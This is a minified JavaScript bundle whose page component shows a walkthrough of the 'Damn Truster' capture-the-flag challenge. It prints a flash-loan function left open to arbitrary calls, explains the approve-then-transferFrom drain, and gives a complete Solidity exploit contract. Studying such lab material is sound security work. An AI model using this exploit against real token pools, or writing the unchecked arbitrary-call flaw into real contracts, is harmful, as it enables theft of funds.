/*! For license information please see 953.591e3fff.chunk.js.LICENSE.txt */
"use strict";(self.webpackChunkclient=self.webpackChunkclient||[]).push([[953],{73:(e,a,n)=>{n.d(a,{A:()=>s});const s=(0,n(7784).A)("Zap",[["path",{d:"M4 14a1 1 0 0 1-.78-1.63l9.9-10.2a.5.5 0 0 1 .86.46l-1.92 6.02A1 1 0 0 0 13 10h7a1 1 0 0 1 .78 1.63l-9.9 10.2a.5.5 0 0 1-.86-.46l1.92-6.02A1 1 0 0 0 11 14z",key:"1xq2db"}]])},2105:(e,a,n)=>{n.d(a,{A:()=>s});const s=(0,n(7784).A)("Code",[["polyline",{points:"16 18 22 12 16 6",key:"z7tu5w"}],["polyline",{points:"8 6 2 12 8 18",key:"1eg1df"}]])},2382:(e,a,n)=>{n.d(a,{A:()=>s});const s=(0,n(7784).A)("ChevronDown",[["path",{d:"m6 9 6 6 6-6",key:"qrunsl"}]])},3165:(e,a,n)=>{n.d(a,{A:()=>s});const s=(0,n(7784).A)("Target",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"12",r:"6",key:"1vlfrh"}],["circle",{cx:"12",cy:"12",r:"2",key:"1c9p78"}]])},5727:(e,a,n)=>{n.d(a,{A:()=>s});const s=(0,n(7784).A)("Lock",[["rect",{width:"18",height:"11",x:"3",y:"11",rx:"2",ry:"2",key:"1w4ew1"}],["path",{d:"M7 11V7a5 5 0 0 1 10 0v4",key:"fwvmzm"}]])},8729:(e,a,n)=>{n.d(a,{A:()=>s});const s=(0,n(7784).A)("BookText",[["path",{d:"M4 19.5v-15A2.5 2.5 0 0 1 6.5 2H19a1 1 0 0 1 1 1v18a1 1 0 0 1-1 1H6.5a1 1 0 0 1 0-5H20",key:"k3hazp"}],["path",{d:"M8 11h8",key:"vwpz6n"}],["path",{d:"M8 7h6",key:"1f0q6e"}]])},8953:(e,a,n)=>{n.r(a),n.d(a,{default:()=>p});n(5043);var s=n(457),l=n(8628),t=n(5727),r=n(7719),c=n(2382),i=n(3165),d=n(8729),o=n(73),h=n(2105),x=n(579);const p=()=>(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h3",{className:"d-flex align-items-center gap-2 mb-3",children:[(0,x.jsx)(t.A,{size:20,className:"text-muted"}),"Damn Truster CTF Challenge"]}),(0,x.jsx)(s.A,{defaultActiveKey:"0",children:(0,x.jsxs)(l.A,{children:[(0,x.jsxs)(s.A.Header,{as:l.A.Header,className:"d-flex justify-content-between align-items-center",children:[(0,x.jsxs)("div",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(r.A,{size:18,className:"text-warning"}),(0,x.jsx)("strong",{children:"View Challenge Solution"})]}),(0,x.jsx)(c.A,{size:18})]}),(0,x.jsx)(s.A.Body,{children:(0,x.jsxs)(l.A.Body,{children:[(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(i.A,{size:18}),"Challenge Goal"]}),(0,x.jsx)("p",{children:"Drain all 1 million DVT tokens from the pool starting with 0 DVT, in a single transaction."})]}),(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(d.A,{size:18}),"Pool Setup"]}),(0,x.jsxs)("ul",{children:[(0,x.jsx)("li",{children:"Holds 1 million DVT tokens"}),(0,x.jsx)("li",{children:"Offers free flash loans"})]}),(0,x.jsx)("h6",{className:"mt-3",children:"Vulnerable flashLoan function:"}),(0,x.jsx)("pre",{className:"bg-light p-2 rounded",children:'function flashLoan(\n    uint256 borrowAmount,\n    address borrower,\n    address target,\n    bytes calldata data\n) external {\n    uint256 balanceBefore = token.balanceOf(address(this));\n    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");\n\n    token.transfer(borrower, borrowAmount);\n    target.functionCall(data); // \u2190 DANGEROUS: no validation\n\n    uint256 balanceAfter = token.balanceOf(address(this));\n    require(balanceAfter >= balanceBefore, "Flash loan not paid back");\n}'})]}),(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(r.A,{size:18,className:"text-danger"}),"Vulnerability Breakdown"]}),(0,x.jsx)("h6",{children:"1. Unrestricted function call"}),(0,x.jsxs)("p",{children:["The ",(0,x.jsx)("code",{children:"target.functionCall(data)"})," lets any contract be called with arbitrary data:"]}),(0,x.jsxs)("ul",{children:[(0,x.jsxs)("li",{children:[(0,x.jsx)("code",{children:"target"})," can be any contract (e.g., the DVT token contract)"]}),(0,x.jsxs)("li",{children:[(0,x.jsx)("code",{children:"data"})," can be any payload (e.g., an ",(0,x.jsx)("code",{children:"approve()"})," call)"]})]})]}),(0,x.jsxs)("div",{className:"mb-4",children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(o.A,{size:18,className:"text-primary"}),"Exploit Strategy"]}),(0,x.jsxs)("ol",{children:[(0,x.jsxs)("li",{children:["Call ",(0,x.jsx)("code",{children:"flashLoan()"})," with:",(0,x.jsxs)("ul",{children:[(0,x.jsxs)("li",{children:[(0,x.jsx)("code",{children:"borrowAmount = 0"})," (no actual loan needed)"]}),(0,x.jsx)("li",{children:(0,x.jsx)("code",{children:"target = DVT token contract"})}),(0,x.jsxs)("li",{children:[(0,x.jsx)("code",{children:"data = approve(attacker, 1_000_000e18)"})," call"]})]})]}),(0,x.jsx)("li",{children:"This tricks the pool into approving the attacker to spend its tokens"}),(0,x.jsxs)("li",{children:["Then call ",(0,x.jsx)("code",{children:"transferFrom()"})," to drain all tokens"]})]}),(0,x.jsx)("pre",{className:"bg-light p-2 rounded mt-2",children:'// Malicious calldata\nabi.encodeWithSignature(\n    "approve(address,uint256)",\n    attacker,\n    1_000_000 ether\n);'})]}),(0,x.jsxs)("div",{children:[(0,x.jsxs)("h5",{className:"d-flex align-items-center gap-2",children:[(0,x.jsx)(h.A,{size:18}),"Exploit Contract"]}),(0,x.jsx)("pre",{className:"bg-light p-3 rounded",children:'contract TrusterExploit {\n    IERC20 public immutable token;\n    TrusterLenderPool public immutable pool;\n    address public attacker;\n\n    constructor(address _token, address _pool, address _attacker) {\n        token = IERC20(_token);\n        pool = TrusterLenderPool(_pool);\n        attacker = _attacker;\n    }\n\n    function attack() external {\n        // Build malicious calldata for DVT.approve()\n        bytes memory data = abi.encodeWithSignature(\n            "approve(address,uint256)",\n            attacker,\n            1_000_000 ether\n        );\n\n        // Execute flash loan with arbitrary call\n        pool.flashLoan(0, attacker, address(token), data);\n\n        // Drain all tokens using the approval\n        token.transferFrom(address(pool), attacker, 1_000_000 ether);\n    }\n}'})]})]})})]})})]})}}]);
//# sourceMappingURL=953.591e3fff.chunk.js.map